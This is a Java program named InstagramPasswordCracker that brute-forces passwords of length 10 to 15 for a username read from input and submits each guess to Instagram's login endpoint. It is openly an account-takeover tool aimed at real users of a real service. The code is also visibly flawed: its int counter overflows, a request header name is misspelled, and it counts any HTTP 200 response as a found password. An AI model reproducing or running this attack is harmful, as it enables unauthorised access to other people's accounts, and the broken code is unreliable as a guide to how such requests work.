import java.util.Scanner;
import java.net.HttpURLConnection;
import java.net.URL;

public class InstagramPasswordCracker {
    public static void main(String[] args) {
        try (Scanner scanner = new Scanner(System.in)) {
            System.out.print("Enter the username: ");
            String username = scanner.nextLine();

            String password = "";
            String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-={}:<>?,./!";

            for (int length = 10; length <= 15; length++) {
                for (int i = 0; i < Math.pow(characters.length(), length); i++) {
                    password = generatePassword(characters, length, i);
                    System.out.println("Trying password: " + password);
                    if (checkPassword(username, password)) {
                        System.out.println("Password found: " + password);
                        return;
                    }
                }
            }
        }
    }

    public static String generatePassword(String characters, int length, int index) {
        StringBuilder password = new StringBuilder();
        for (int i = 0; i < length; i++) {
            password.append(characters.charAt(index % characters.length()));
            index /= characters.length();
        }
        return password.reverse().toString();
    }

    @SuppressWarnings("deprecation")
    public static boolean checkPassword(String username, String password) {
        try {
            URL url = new URL("https://www.instagram.com/accounts/login/ajax/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("User -Agent", "Mozilla/5.0");
            connection.setDoOutput(true);

            String data = "username=" + username + "&password=" + password;
            connection.getOutputStream().write(data.getBytes());

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                return true;
            }
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
        return false;
    }
}